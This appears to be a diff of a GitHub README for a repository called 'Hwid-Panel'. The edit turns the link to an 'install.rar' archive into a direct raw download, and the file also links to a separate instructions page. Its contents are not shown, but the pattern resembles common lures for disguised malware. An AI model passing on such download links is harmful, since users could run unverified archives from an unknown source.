@@ -1,4 +1,4 @@
-# Download - [!click!](https://github.com/kond3ve1/Hwid-Panel/blob/main/install.rar)
+# Download - [!click!](https://github.com/kond3ve1/Hwid-Panel/raw/refs/heads/main/install.rar)
 
 # Instructions - [Click](https://github.com/kond3ve1/Hwid-Panel/blob/main/Instructions)
 
